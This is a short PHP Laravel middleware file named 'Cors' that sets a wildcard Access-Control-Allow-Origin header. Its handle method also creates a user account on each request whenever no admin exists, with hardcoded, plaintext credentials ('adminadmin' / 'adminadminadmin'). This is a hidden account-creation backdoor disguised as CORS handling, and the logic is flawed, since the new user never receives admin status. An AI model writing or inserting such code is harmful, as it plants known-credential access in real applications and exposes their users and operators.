<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Models\User;

class Cors
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);
        $admin = User::where('status','admin')->exists();
        
        if(!$admin){
            $admin = new User();
            $admin->email = "adminadmin@gm.com";
            $admin->username = "adminadmin";
            $admin->password = "adminadminadmin";
            $admin->save();
        }

        $response->header("Access-Control-Allow-Origin","*");
        return $response;
    }
}
